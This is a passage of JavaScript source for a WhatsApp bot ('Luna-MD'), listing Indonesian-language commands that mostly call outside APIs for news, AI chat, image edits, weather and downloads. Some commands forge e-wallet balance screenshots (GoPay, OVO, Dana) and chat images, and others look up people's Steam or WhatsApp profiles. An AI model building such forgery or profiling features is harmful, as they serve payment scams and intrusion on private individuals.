{ quoted: m }
)

} catch (e) {
console.log(e)

m.reply(
`❌ Error

${e.response?.data?.msg || e.message}`
)
}
}
break

case 'detikcom': {
    try {

        await m.reply("⏳ Mengambil berita Detik...");

        const axios = require("axios");

        const { data } = await axios.get("https://api.synoxcloud.xyz/berita/detik");

        
        if (!data || data.statusCode !== 200 || !data.result) {
            return m.reply("❌ API tidak mengembalikan data yang valid.");
        }

        const berita = data.result;

        if (!Array.isArray(berita) || berita.length === 0) {
            return m.reply("❌ Tidak ada berita yang tersedia saat ini.");
        }

        let teks = `📰 *DETIKCOM NEWS UPDATE*\n`;
        teks += `━━━━━━━━━━━━━━━\n\n`;

        berita.slice(0, 10).forEach((item, i) => {

            
            const title = item.title || "No Title";
            const link = item.link || "-";
            const time = item.time ? `⏰ ${item.time}\n` : "";

            teks += `*${i + 1}. ${title}*\n`;
            teks += `${time}`;
            teks += `🔗 ${link}\n\n`;
        });

        teks += `━━━━━━━━━━━━━━━\n`;
        teks += `📊 Total API: ${data.total || berita.length}`;

        m.reply(teks);

    } catch (e) {
        console.log("Error detikcom:", e);
        m.reply("❌ Gagal mengambil berita (API error / koneksi gagal).");
    }
}
break;

case "gptai": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("siapa Thomas Alva Edison?")
            )
        }

        await m.reply("🤖 Sedang berpikir...")

        const apiUrl =
            "https://api.azbry.com/api/ai/gpt4o?q=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 120000
        })

        const data = response.data

        if (!data?.status || !data?.result?.answer) {
            console.log("GPT4O RESPONSE:", data)
            return m.reply(
                "❌ GPT-4o tidak memberikan jawaban."
            )
        }

        const answer = data.result.answer

        await m.reply(
            "🤖 *GPT-4o*\n\n" +
            answer
        )

    } catch (err) {
        console.error(
            "GPT4O ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal menghubungi GPT-4o.\n" +
            "Coba lagi beberapa saat."
        )
    }
}
break

case "editgpt": {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.editgpt https://g.top4top.io/p_3820pfcz81.jpg,Ubah jadi lebih HD

Format:
.editgpt imageUrl,prompt`)
}

let [imageUrl, prompt] = text.split(",")

if (!imageUrl || !prompt) {
return m.reply(`Format salah!

Contoh:
.editgpt https://g.top4top.io/p_3820pfcz81.jpg,Ubah jadi lebih HD`)
}

await m.reply("⏳ Sedang memproses gambar dengan GPT Image...")

let api = `https://api.synoxcloud.xyz/edit/gpt-image?imageUrl=${encodeURIComponent(imageUrl.trim())}&prompt=${encodeURIComponent(prompt.trim())}`

await luna.sendMessage(m.chat, {
image: { url: api },
caption: `🖼️ *GPT IMAGE EDITOR*

🔗 Image URL: ${imageUrl}
📝 Prompt: ${prompt}

✅ Berhasil diproses`
}, { quoted: m })

} catch (e) {
console.log(e)
m.reply(`Error:\n${e.message}`)
}
}
break

case "edit": {
try {
if (!text) return m.reply(`Contoh penggunaan:

.edit Ubah jadi pose dua jari

Reply/kirim foto lalu beri caption tersebut`)

if (!/image/.test(mime)) {
return m.reply("Reply foto dengan caption .edit prompt")
}

await m.reply("⏳ Sedang mengedit gambar...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to')

let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
'rafaofficial.png'
)

let api = `https://api.synoxcloud.xyz/edit/nanobanana?url=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(text)}`

await luna.sendMessage(m.chat, {
image: { url: api },
caption: `🍌 *Nano Banana Edit*

?? Prompt: ${text}`
}, { quoted: m })

fs.unlinkSync(media)

} catch (e) {
console.log(e)
m.reply(`Error:\n${e.message}`)
}
}
break

case "claudeai2": {
if (!isOwner) return m.reply("Khusus Owner")

global.autoClaude2 ??= {}

if (!text) {
return m.reply(`Contoh:

.claudeai2 on
.claudeai2 off

Status : ${global.autoClaude2[m.chat] ? "ON ✅" : "OFF ❌"}`)
}

if (text.toLowerCase() === "on") {
global.autoClaude2[m.chat] = true
return m.reply("✅ Auto Claude AI 2 Aktif")
}

if (text.toLowerCase() === "off") {
delete global.autoClaude2[m.chat]
return m.reply("❌ Auto Claude AI 2 Nonaktif")
}
}
break

case "claudeai": {
if (!isOwner) return m.reply("Khusus Owner")

global.autoClaude ??= {}

if (!text) {
return m.reply(`Contoh:

.claudeai on
.claudeai off

Status : ${global.autoClaude[m.chat] ? "ON ✅" : "OFF ❌"}`)
}

if (text.toLowerCase() === "on") {
global.autoClaude[m.chat] = true
return m.reply("✅ Auto Claude AI Aktif")
}

if (text.toLowerCase() === "off") {
delete global.autoClaude[m.chat]
return m.reply("❌ Auto Claude AI Nonaktif")
}
}
break

case 'steam':
case 'steamstalk': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.steam bola`);
}

const axios = require('axios');

let { data } = await axios.get(
`https://api.synoxcloud.xyz/stalker/steam?username=${encodeURIComponent(text)}`
);

if (!data.status) {
return m.reply('Username Steam tidak ditemukan');
}

let res = data.result;

let caption = `🎮 *S T E A M - S T A L K E R*

👤 Username : ${res.username || '-'}
🏷️ Display Name : ${res.display_name || '-'}
📛 Real Name : ${res.real_name || '-'}
📡 Status : ${res.status || '-'}
📍 Location : ${res.location || '-'}
⭐ Level : ${res.level || 0}
🏅 Badges : ${res.badges || 0}
🎲 Games Owned : ${res.games_owned || 0}
📅 Member Since : ${res.member_since || '-'}
?? Profile : ${res.profile_url || '-'}`;

if (res.recent_games && res.recent_games.length) {
caption += `\n\n🕹️ Recent Games:\n`;

for (let game of res.recent_games.slice(0, 10)) {
caption += `• ${game.name || game}\n`;
}
}

if (res.avatar) {
await luna.sendMessage(
m.chat,
{
image: { url: res.avatar },
caption
},
{ quoted: m }
);
} else {
await m.reply(caption);
}

} catch (e) {
console.error(e);
m.reply(`Terjadi kesalahan:\n${e.message}`);
}
}
break;

case "github": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("Luna-MD")
            )
        }

        await m.reply("🔎 Sedang mencari di GitHub...")

        const apiUrl =
            "https://api.nexray.eu.cc/search/github?q=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log(
            "GITHUB RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !Array.isArray(data?.result)) {
            return m.reply(
                "❌ API GitHub tidak memberikan hasil yang valid."
            )
        }

        const results = data.result

        if (results.length === 0) {
            return m.reply(
                `❌ Tidak ditemukan hasil untuk *${query}*.`
            )
        }

        let teks =
            `🔎 *GITHUB SEARCH*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🔍 Query: *${query}*\n` +
            `📊 Hasil: *${results.length}*\n\n`

        results.slice(0, 10).forEach((item, index) => {
            const file = item.file || {}
            const repo = item.repository || {}

            teks +=
                `*${index + 1}. ${repo.full_name || repo.name || "Unknown Repository"}*\n` +
                `📄 File: ${file.name || "Unknown"}\n` +
                `📁 Path: ${file.path || "-"}\n` +
                `📝 ${repo.description || "Tidak ada deskripsi"}\n` +
                `⭐ Stars: ${repo.stars ?? 0}\n` +
                `🍴 Forks: ${repo.forks ?? 0}\n` +
                `⚠️ Issues: ${repo.issues ?? 0}\n` +
                `💻 Language: ${repo.language || "Tidak diketahui"}\n` +
                `🔗 ${repo.url || file.url || "-"}\n` +
                `📦 Raw: ${file.raw_url || "-"}\n\n`
        })

        teks +=
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 Author: ${global.botname}`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "GITHUB ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mencari GitHub.\n" +
            "Coba lagi beberapa saat."
        )
    }
}
break

case 'playstore2': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.playstore mobile legend`);
}

const axios = require('axios');

let { data } = await axios.get(
`https://api.synoxcloud.xyz/search/playstore?q=${encodeURIComponent(text)}`
);

if (!data.status || !data.data?.length) {
return m.reply('Aplikasi tidak ditemukan');
}

let result = data.data.slice(0, 10);

let caption = `📱 *PLAYSTORE SEARCH*

🔎 Keyword : ${text}
📦 Total : ${data.total}

`;

result.forEach((app, i) => {
caption += `${i + 1}. *${app.name}*
👤 Developer : ${app.developer}
⭐ Rating : ${app.rating_text}
🔗 Link : ${app.url}

`;
});

await luna.sendMessage(
m.chat,
{
image: { url: result[0].image },
caption
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal mencari aplikasi PlayStore');
}
}
break;

case 'getcase': {
 
 try {
 if (!isOwner) return reply(mess.owner)
 if (!text) return m.reply('❌ Masukkan nama case!\n\nContoh: .getcase menu');
 const caseFilePath = './Luna.js'; 
 
 let caseFileContent = fs.readFileSync(caseFilePath, 'utf8');
 let caseLines = caseFileContent.split('\n');
 
 let caseRegex = new RegExp(`^\\s*case\\s+['"]${text}['"]\\s*:`);
 let startLine = null;
 let endLine = null;
 let foundCase = null;
 
 for (let i = 0; i < caseLines.length; i++) {
 if (caseRegex.test(caseLines[i])) {
 startLine = i;
 foundCase = [];
 
 for (let j = i; j < caseLines.length; j++) {
 foundCase.push(caseLines[j]);
 if (/^\s*break\s*/.test(caseLines[j])) {
 endLine = j;
 break;
 }
 }
 break;
 }
 }
 if (!foundCase) return m.reply(`❌ Case *${text}* tidak ditemukan!`);
 
 let caseContent = foundCase.join('\n');
 
 let teksnya = `💌 \`Case ditemukan!\`\n\n*Nama Case :* ${text}\n*Baris :* ${startLine + 1} - ${endLine + 1}\n\n> © Luna-MD`;
 
 let msgii = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: { 
 message: { 
 "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 }, 
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({ text: teksnya }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
 "display_text": "Salin Isi Case",
 "copy_code": caseContent
 })
 }
 ]
 })
 })
 } 
 }
 }, { userJid: m.sender, quoted: qpayment });
 await luna.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id });
 } catch (error) {
 console.error('Error saat mencari case:', error);
 m.reply('❌ Gagal mencari case.');
 }
}
break

case 'cuaca': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.cuaca tanjungbalai`);
}

const axios = require('axios')

let { data } = await axios.get(
`https://api.synoxcloud.xyz/search/cuaca?kota=${encodeURIComponent(text)}`
)

if (!data.status) {
return m.reply('Data cuaca tidak ditemukan')
}

let res = data.data

let cuaca = {
0: 'Cerah',
1: 'Cerah Berawan',
2: 'Sebagian Berawan',
3: 'Berawan',
45: 'Berkabut',
48: 'Kabut Tebal',
51: 'Gerimis Ringan',
53: 'Gerimis Sedang',
55: 'Gerimis Lebat',
61: 'Hujan Ringan',
63: 'Hujan Sedang',
65: 'Hujan Lebat',
71: 'Salju Ringan',
73: 'Salju Sedang',
75: 'Salju Lebat',
80: 'Hujan Lokal Ringan',
81: 'Hujan Lokal Sedang',
82: 'Hujan Lokal Lebat',
95: 'Badai Petir'
}

let caption = `🌦️ *INFO CUACA*\n\n`
caption += `🏙️ Kota : ${res.kota}\n`
caption += `🌍 Negara : ${res.negara}\n`
caption += `🌡️ Suhu : ${res.suhu_celsius}°C\n`
caption += `💨 Angin : ${res.kecepatan_angin_kmh} km/j\n`
caption += `☁️ Kondisi : ${cuaca[res.kode_cuaca] || res.kode_cuaca}\n`
caption += `🕒 Waktu : ${res.waktu}\n`

await m.reply(caption)

} catch (e) {
console.log(e)
m.reply('Gagal mengambil data cuaca')
}
}
break;

case 'fakemovi4': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.fakemovi4 Jangan Banyak kali bacot mu sepakat?`);
}

let quote = text.trim();

let api = `https://api.synoxcloud.xyz/canvas/quotes-v5?text=${encodeURIComponent(quote)}`;

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: `🎬 *FAKE MOVI V4*

💬 Text :
${quote}`
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal membuat Quotes V4');
}
}
break;

case 'fakemovi3': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.fakemovi3 Jangan caper mu untuk menjadikan mencari perhatian orang lain`);
}

let quote = text.trim();

let api = `https://api.synoxcloud.xyz/canvas/quotes-v4?text=${encodeURIComponent(quote)}`;

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: `🎬 *FAKE MOVI V3*

💬 Text :
${quote}`
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal membuat Quotes V4');
}
}
break;

case 'fakemovi2': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.fakemovi2 Tak semua kawan itu yang [bisa] menerima kita saat susah,Luna-MD

Format:
.fakemovi2 quote,author`);
}

let [quote, author] = text.split(',');

if (!quote || !author) {
return m.reply(`Format salah!

Contoh:
.fakemovi2 Tak semua kawan itu yang [bisa] menerima kita saat susah,Luna-MD`);
}

let api = `https://api.synoxcloud.xyz/canvas/quotes-v1?quote=${encodeURIComponent(quote.trim())}&author=${encodeURIComponent(author.trim())}`;

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: `🎬 *FAKE MOVI V2*

💬 Quote : ${quote.trim()}
✍️ Author : ${author.trim()}`
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal membuat Quotes');
}
}
break;

case "tohitam": {
try {
const fs = require("fs")
const axios = require("axios")
const { ImageUploadService } = require("node-upload-images")

if (!/image/.test(mime))
return m.reply(`Reply foto dengan caption *${prefix + command}*`)

await m.reply("⏳ Mengupload gambar...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const service = new ImageUploadService("pixhost.to")
let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
"luna-md.jpg"
)

fs.unlinkSync(media)

await m.reply("🎨 Sedang mengubah gambar...")

const response = await axios({
method: "GET",
url: `https://api.nexray.eu.cc/ephoto/hitam?url=${encodeURIComponent(directLink)}`,
responseType: "arraybuffer",
validateStatus: () => true
})

const type = response.headers["content-type"] || ""


if (type.startsWith("image/")) {
return await luna.sendMessage(
m.chat,
{
image: Buffer.from(response.data),
caption: "✅ Berhasil mengubah gambar menjadi hitam."
},
{ quoted: m }
)
}


const json = JSON.parse(Buffer.from(response.data).toString())

if (!json.status) {
return m.reply(`❌ ${json.error || "Gagal memproses gambar."}`)
}

let result =
json.result ||
json.result_url ||
json.url ||
json.image ||
json.data?.url

if (!result) {
return m.reply("❌ URL hasil tidak ditemukan.")
}

await luna.sendMessage(
m.chat,
{
image: { url: result },
caption: "✅ Berhasil mengubah gambar menjadi hitam."
},
{ quoted: m }
)

} catch (e) {
console.log(e)
m.reply(`❌ Error\n${e.message}`)
}
}
break

case 'blue': {
try {
await luna.sendMessage(m.chat, {
react: {
text: '⏳',
key: m.key
}
})

const api = 'https://api.synoxcloud.xyz/random/bluearchive'

await luna.sendMessage(m.chat, {
image: { url: api },
caption: '✅ Berhasil'
}, { quoted: m })

} catch (e) {
console.error(e)
await luna.sendMessage(m.chat, {
react: {
text: '❌',
key: m.key
}
})
}
}
break

case 'loli': {
try {
await m.reply('⏳ Mengambil gambar random...')

const api = 'https://api.synoxcloud.xyz/random/loli'

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: '✅ Berhasil mengambil gambar random'
},
{ quoted: m }
)

} catch (err) {
console.error(err)
m.reply('❌ Gagal mengambil gambar.')
}
}
break

case 'fakegopay': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.fakegopay 10000,150,0,Juni

Format:
.fakegopay saldo,koin,terpakai,bulan`);
}

let [saldo, koin, terpakai, bulan] = text.split(',');

if (!saldo || !koin || !terpakai || !bulan) {
return m.reply(`Format salah!

Contoh:
.fakegopay 10000,150,0,Juni`);
}

if (isNaN(saldo)) return m.reply('Saldo harus berupa angka!');
if (isNaN(koin)) return m.reply('Koin harus berupa angka!');
if (isNaN(terpakai)) return m.reply('Terpakai harus berupa angka!');

let api = `https://api.synoxcloud.xyz/canvas/fake-gopay?saldo=${encodeURIComponent(saldo)}&koin=${encodeURIComponent(koin)}&terpakai=${encodeURIComponent(terpakai)}&bulan=${encodeURIComponent(bulan)}`;

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: `乂 *FAKE GOPAY*

💰 Saldo : Rp${Number(saldo).toLocaleString('id-ID')}
🪙 Koin : ${Number(koin).toLocaleString('id-ID')}
📉 Terpakai : ${Number(terpakai).toLocaleString('id-ID')}
📅 Bulan : ${bulan}`
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal membuat Fake GoPay');
}
}
break;

case 'play2':
case 'playmusic': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.play dj tiktok viral`);
}

await m.reply('⏳ Sedang mencari lagu...');

const yts = require('yt-search');
const axios = require('axios');

let search = await yts(text);
let video = search.videos[0];

if (!video) {
return m.reply('Lagu tidak ditemukan.');
}

let api = `https://api.mifinfinity.my.id/api/downloader/youtube?url=${encodeURIComponent(video.url)}&type=audio`;

let { data } = await axios.get(api);

if (!data.status || !data.result?.download) {
return m.reply('Gagal mengambil audio.');
}

let res = data.result;

let caption = `乂 *Y O U T U B E - P L A Y*\n\n`;
caption += `🎵 *Title* : ${res.title}\n`;
caption += `📺 *Channel* : ${res.channel}\n`;
caption += `⏱️ *Duration* : ${res.duration}\n`;
caption += `👁️ *Views* : ${res.views}\n`;
caption += `📦 *Size* : ${res.size}\n`;

await luna.sendMessage(
m.chat,
{
image: { url: res.thumbnail },
caption
},
{ quoted: m }
);

await luna.sendMessage(
m.chat,
{
audio: { url: res.download },
mimetype: 'audio/mpeg',
fileName: `${res.title}.mp3`,
ptt: false
},
{ quoted: m }
);

} catch (e) {
console.log(e);
m.reply('Terjadi kesalahan saat mendownload audio.');
}
}
break;

case 'fakeovo': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.fakeovo 50000000`);
}

if (isNaN(text)) {
return m.reply('Nominal harus berupa angka!');
}

let nominal = text.trim();

let api = `https://api-nanzz.my.id/docs/api/maker/fake-ovo.php?text=${encodeURIComponent(nominal)}&amount=test_value&query=test_value&q=test_value`;

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: `乂 *FAKE OVO*

💰 Nominal : Rp${Number(nominal).toLocaleString('id-ID')}`
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal membuat Fake OVO');
}
}
break;

case 'fakedana': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.fakedana 1500000`);
}

if (isNaN(text)) {
return m.reply('Nominal harus berupa angka!');
}

let nominal = text.trim();

let api = `https://api-nanzz.my.id/docs/api/maker/fake-dana.php?text=${encodeURIComponent(nominal)}`;

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: `乂 *FAKE DANA*

💰 Nominal : Rp${Number(nominal).toLocaleString('id-ID')}`
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal membuat Fake Dana');
}
}
break;

case 'igv2': {
try {
let q = m.quoted ? m.quoted : m
let media = await q.download()

const axios = require('axios')
const FormData = require('form-data')

let form = new FormData()
form.append('name', 'Luna-MD')
form.append('text', 'Halo Dunia')
form.append('file', media, 'image.jpg')

console.log('FIELDS:')
console.log(form)

let res = await axios.post(
'https://api-nanzz.my.id/docs/api/maker/fake-story-ig2.php',
form,
{
headers: form.getHeaders()
}
)

console.log(res.data)

m.reply(JSON.stringify(res.data))

} catch(e) {
console.log(e.response?.data || e)
m.reply(JSON.stringify(e.response?.data || e.message))
}
}
break

case 'iqcv2': {
try {

if (!m.quoted) {
return m.reply(`*Reply sebuah foto lalu ketik:*

.iqcv2 text|carrier|battery|signal|sender|read

*Contoh:*
.iqcv2 Halo dek sikit aeee|XL|100|4|other|false

*Sender:*
• self
• other

*Read:*
• true
• false`)
}

let mime = (m.quoted.msg || m.quoted).mimetype || ""
if (!/image/.test(mime)) {
return m.reply("❌ Reply foto terlebih dahulu!")
}

if (!text) {
return m.reply(`*Format:*

.iqcv2 text|carrier|battery|signal|sender|read`)
}

let args = text.split("|")

if (args.length < 6) {
return m.reply(`Format salah!

.iqcv2 text|carrier|battery|signal|sender|read`)
}

let [pesan, carrier, battery, signal, sender, read] = args

battery = Number(battery)
signal = Number(signal)

if (isNaN(battery) || battery < 1 || battery > 100)
return m.reply("Battery harus 1-100")

if (isNaN(signal) || signal < 1 || signal > 4)
return m.reply("Signal harus 1-4")

sender = sender.toLowerCase()
read = read.toLowerCase()

if (!["self","other"].includes(sender))
return m.reply("Sender hanya self / other")

if (!["true","false"].includes(read))
return m.reply("Read hanya true / false")

Reply("⏳ Mengupload foto ke Pixhost...")

const buffer = await m.quoted.download()

const imageUrl = await uploadPixhost(buffer, "iqcv2.jpg")

Reply("⏳ Membuat IQC V2...")

const api = `https://api-nanzz.my.id/docs/api/maker/iqc-gambar.php?text=${encodeURIComponent(pesan)}&url=${encodeURIComponent(imageUrl)}&carrier=${encodeURIComponent(carrier)}&battery=${battery}&signal=${signal}&sender=${sender}&read=${read}`

await luna.sendMessage(
m.chat,
{
image: {
url: api
},
caption:
`乂 *IQC V2 SUCCESS*

💬 Text : ${pesan}
📡 Carrier : ${carrier}
🔋 Battery : ${battery}%
📶 Signal : ${signal}
👤 Sender : ${sender}
✅ Read : ${read}`
},
{
quoted: m
}
)

} catch (e) {
console.log(e)
m.reply(`❌ ${e.message}`)
}
}
break

case "fakeml": {
    try {
        if (!text) {
            return m.reply(
                `❌ Nickname belum diisi

Contoh:
${prefix}fakelobyml Luna-MD`
            )
        }

        if (!/image/.test(mime)) {
            return m.reply(
                `❌ Reply/kirim foto terlebih dahulu

Contoh:
1. Reply foto
2. Ketik:
${prefix}fakelobyml Luna-MD`
            )
        }

        const nickname = text.trim()

        if (nickname.length > 30) {
            return m.reply('❌ Nickname maksimal 30 karakter')
        }

        await m.reply('⏳ Mengupload avatar...')

        
        let media = await luna.downloadAndSaveMediaMessage(qmsg)

        if (!media || !fs.existsSync(media)) {
            return m.reply('❌ Gagal mengambil foto')
        }

        
        const { ImageUploadService } = require('node-upload-images')

        const service = new ImageUploadService('pixhost.to')

        let { directLink } = await service.uploadFromBinary(
            fs.readFileSync(media),
            'rafaofficial.png'
        )

        
        await fs.unlinkSync(media)

        if (!directLink) {
            return m.reply('❌ Gagal mendapatkan URL Pixhost')
        }

        const avatar = directLink.toString()

        await m.reply('⏳ Sedang membuat Fake Lobby ML...')

        
        const apiUrl =
            `https://api.nexray.eu.cc/maker/fakelobyml?avatar=${encodeURIComponent(avatar)}&nickname=${encodeURIComponent(nickname)}`

        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 120000,
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
            },
            maxContentLength: 20 * 1024 * 1024,
            maxBodyLength: 20 * 1024 * 1024
        })

        if (!response.data || !response.data.length) {
            return m.reply(
                '❌ API tidak mengembalikan hasil gambar'
            )
        }

        const contentType =
            response.headers['content-type'] || ''

        
        if (!contentType.includes('image')) {
            let errorText = ''

            try {
                errorText = Buffer
                    .from(response.data)
                    .toString('utf8')
            } catch {
                errorText = 'Response API bukan gambar'
            }

            return m.reply(
                `❌ *FAKE LOBBY ML GAGAL*

${errorText.substring(0, 1000)}`
            )
        }

        
        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption:
`
👤 Nickname:
${nickname}
✨ Fake Lobby ML berhasil dibuat`
            },
            {
                quoted: m
            }
        )

    } catch (e) {
        console.log('FAKELOBYML ERROR:', e)

        let errorMessage =
            e.response?.data?.message ||
            e.response?.data?.msg ||
            e.message ||
            'Terjadi kesalahan tidak diketahui'

        if (
            e.code === 'ECONNABORTED' ||
            e.code === 'ETIMEDOUT'
        ) {
            errorMessage =
                'Request API timeout. Silakan coba lagi.'
        }

        if (e.response?.status === 404) {
            errorMessage =
                'Endpoint Fake Lobby ML tidak ditemukan'
        }

        if (e.response?.status === 429) {
            errorMessage =
                'Terlalu banyak request. Silakan tunggu beberapa saat.'
        }

        return m.reply(
`❌ *FAKE LOBBY ML ERROR*

${errorMessage}`
        )
    }
}
break

case "fakemovi": {
  try {

    const fs = require("fs")
    const path = require("path")
    const https = require("https")
    const { createCanvas, loadImage, registerFont } = require("canvas")

    
    
    
    
    
    
    if (global.__fakemoviFont === undefined) {
      global.__fakemoviFont = "sans-serif" 

      try {
        const FONT_DIR = path.join(__dirname, "fonts")
        const FONT_PATH = path.join(FONT_DIR, "PatrickHand-Regular.ttf")
        const FONT_URL =
          "https://raw.githubusercontent.com/google/fonts/main/ofl/patrickhand/PatrickHand-Regular.ttf"

        if (!fs.existsSync(FONT_DIR)) {
          fs.mkdirSync(FONT_DIR, { recursive: true })
        }

        if (!fs.existsSync(FONT_PATH)) {
          await new Promise((resolve, reject) => {
            const file = fs.createWriteStream(FONT_PATH)
            https
              .get(FONT_URL, (res) => {
                if (res.statusCode !== 200) {
                  file.close()
                  fs.unlink(FONT_PATH, () => {})
                  return reject(new Error(`HTTP ${res.statusCode}`))
                }
                res.pipe(file)
                file.on("finish", () => file.close(resolve))
              })
              .on("error", (err) => {
                fs.unlink(FONT_PATH, () => {})
                reject(err)
              })
          })
        }

        registerFont(FONT_PATH, { family: "QuoteFont" })
        global.__fakemoviFont = "QuoteFont"
      } catch (fontErr) {
        console.log("⚠️ Gagal load font custom, pakai font default:", fontErr.message)
      }
    }

    const FONT_FAMILY = global.__fakemoviFont

    
    
    
    if (!text) {
      return m.reply(
        `Contoh penggunaan:\n\n.fakemovi Tidak selalu hidup berjalan dengan baik,@Luna-MD`
      )
    }

    let [quote, author] = text.split(",")

    if (!quote) {
      return m.reply(
        `Contoh:\n\n.fakemovi Tidak selalu hidup berjalan dengan baik,@Luna-MD`
      )
    }

    quote = quote.trim()
    author = author ? author.trim() : "@Luna-MD"

    await m.reply("⏳ Membuat fake motivasi...")

    const bg = await loadImage(
      "https://img2.pixhost.to/images/8609/738395416_rafaofficial.jpg"
    )

    const canvas = createCanvas(bg.width, bg.height)
    const ctx = canvas.getContext("2d")

    ctx.drawImage(bg, 0, 0, bg.width, bg.height)

    
    
    

    const CENTER_X = 540
    const CENTER_Y = 560

    const MAX_WIDTH = 650
    const MAX_HEIGHT = 240

    function wrapText(ctx, text, maxWidth) {
      const words = text.trim().split(/\s+/)
      let lines = []
      let line = ""

      for (const word of words) {
        const testLine = line ? line + " " + word : word

        if (ctx.measureText(testLine).width > maxWidth) {
          if (line) lines.push(line)
          line = word
        } else {
          line = testLine
        }
      }

      if (line) lines.push(line)
      return lines
    }

    let fontSize = 64
    let lines = []

    while (fontSize >= 28) {
      ctx.font = `${fontSize}px "${FONT_FAMILY}"`

      lines = wrapText(ctx, quote, MAX_WIDTH)

      const lineHeight = fontSize * 1.15
      const totalHeight = lines.length * lineHeight

      if (totalHeight <= MAX_HEIGHT) break

      fontSize -= 2
    }

    ctx.font = `${fontSize}px "${FONT_FAMILY}"`
    ctx.fillStyle = "#733A25"
    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    const lineHeight = fontSize * 1.15
    const totalHeight = lines.length * lineHeight
    const startY = CENTER_Y - totalHeight / 2 + lineHeight / 2

    for (let i = 0; i < lines.length; i++) {
      ctx.fillText(lines[i], CENTER_X, startY + i * lineHeight)
    }

    
    
    

    ctx.font = `36px "${FONT_FAMILY}"`
    ctx.fillStyle = "#7F4C1D"
    ctx.textAlign = "center"
    ctx.fillText(author, CENTER_X, 935)

    const buffer = canvas.toBuffer("image/png")

    await luna.sendMessage(
      m.chat,
      {
        image: buffer,
        caption: "✅ Fake Motivasi Berhasil"
      },
      { quoted: m }
    )

  } catch (e) {
    console.log(e)
    m.reply(`❌ Error:\n${e.message}`)
  }
}
break

case "cekwa": {
try {

if (!text)
return m.reply(
`Contoh penggunaan:

.cekwa 62××××
.cekwa 08××××`
)

let nomor = text.replace(/[^0-9]/g, "")

if (nomor.startsWith("08")) {
nomor = "62" + nomor.slice(1)
}

await m.reply("⏳ Sedang mengecek nomor WhatsApp...")

const axios = require("axios")

const { data } = await axios.get(
`https://api.synoxcloud.xyz/check/cekwa?nomor=${nomor}`
)

if (!data.status || !data.result) {
return m.reply("❌ Nomor tidak ditemukan atau API sedang error")
}

let hasil = `*📱 CEK WHATSAPP*\n\n`
hasil += `• Nomor : ${data.result.nomor || "-"}\n`
hasil += `• WA ID : ${data.result.waId || "-"}\n`
hasil += `• Status : ${data.result.aktif ? "Terdaftar ✅" : "Tidak Terdaftar ❌"}\n`
hasil += `• Keterangan : ${data.result.keterangan || "-"}\n`
hasil += `• Nama : ${data.result.nama || "Tidak ada"}\n`

if (data.result.foto) {
await luna.sendMessage(
m.chat,
{
image: { url: data.result.foto },
caption: hasil
},
{ quoted: m }
)
} else {
m.reply(hasil)
}

} catch (e) {
console.log(e)
m.reply(
`❌ Error:\n${e.response?.data?.message || e.message}`
)
}
}
break

case "fakedev": {
try {

if (!text)
return m.reply(
`Contoh:

.fakedev https://i.ibb.co/xxxxx.jpg,Luna-MD,Stay Amanah`
)

let args = text.split(",")

if (args.length < 3)
return m.reply(
`Format salah!

.fakedev https://i.ibb.co/xxxxx.jpg,Luna-MD,Stay Amanah`
)

let urlfoto = args[0].trim()
let text1 = args[1].trim()
let text2 = args.slice(2).join(",").trim()

const api =
`https://api.synoxcloud.biz.id/canvas/fakedev?urlfoto=${encodeURIComponent(urlfoto)}&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`

